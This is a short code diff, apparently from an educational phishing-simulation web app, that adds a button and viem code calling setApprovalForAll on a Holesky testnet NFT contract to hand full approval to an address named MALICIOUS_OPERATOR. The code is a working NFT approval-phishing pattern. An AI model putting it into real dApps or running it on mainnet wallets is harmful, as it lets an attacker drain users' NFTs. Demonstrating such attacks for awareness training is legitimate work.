@@ -1,0 +1,39 @@
+<button
+  onClick={approveNFTs}
+  className="bg-green-500 hover:bg-green-600 text-white px-5 py-2 rounded-md transition-colors w-full"
+  disabled={simulationCompleted}
+>
+  {t.nftApprovalPhishing.approveButton}
+</button>
+
+
+const MALICIOUS_OPERATOR = "0xbe535a82f2c3895bdaceb3ffe6b9b80ac2f832a0";
+const fakeNftContractAddress = "0x8a90cab2b38dba80c64b7734e58ee1db38b8992e"; // 示例 NFT 合约地址
+
+const erc721Abi = [
+  {
+    name: "setApprovalForAll",
+    type: "function",
+    stateMutability: "nonpayable",
+    inputs: [
+      { name: "operator", type: "address" },
+      { name: "approved", type: "bool" }
+    ],
+    outputs: []
+  }
+] as const;
+
+const walletClient = createWalletClient({
+  chain: holesky,
+  transport: custom(window.ethereum),
+  account: account as Account
+});
+
+const nftContract = getContract({
+  address: fakeNftContractAddress,
+  abi: erc721Abi,
+  client: walletClient
+});
+
+const hash = await nftContract.write.setApprovalForAll([MALICIOUS_OPERATOR, true]);
+
